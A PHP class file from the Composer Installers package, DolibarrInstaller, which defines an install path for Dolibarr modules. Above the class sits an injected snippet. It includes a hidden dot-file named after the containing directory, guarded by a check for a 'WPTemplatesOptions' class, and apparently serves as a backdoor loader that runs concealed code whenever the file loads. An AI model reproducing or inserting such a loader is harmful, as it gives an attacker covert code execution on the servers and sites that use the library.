<?php
namespace Composer\Installers;

/**
 * Class DolibarrInstaller
 *
 * @package Composer\Installers
 * @author  Raphaël Doursenaud <rdoursenaud@gpcsolutions.fr>
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DolibarrInstaller extends BaseInstaller
{
    //TODO: Add support for scripts and themes
    protected $locations = array(
        'module' => 'htdocs/custom/{$name}/',
    );
}
